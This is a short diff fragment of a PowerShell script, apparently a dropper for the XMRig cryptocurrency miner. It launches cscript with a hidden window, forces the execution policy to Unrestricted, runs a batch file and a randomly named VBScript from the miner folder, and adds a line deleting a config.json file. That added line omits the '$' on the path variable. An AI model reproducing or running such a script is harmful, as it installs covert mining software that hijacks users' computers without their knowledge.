@@ -119,6 +119,7 @@ Start-Process -FilePath "cscript.exe" -windowstyle hidden -ArgumentList "ZDaFvwj
 
 Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
 cd "$initial_dir\xmrig-6.22.2"
+Remove-Item -Path "initial_dir\config.json"
 Start-Process -FilePath ".\w.bat" -NoNewWindow -Wait
 
 & "./TMqhONoBljEv.vbs"
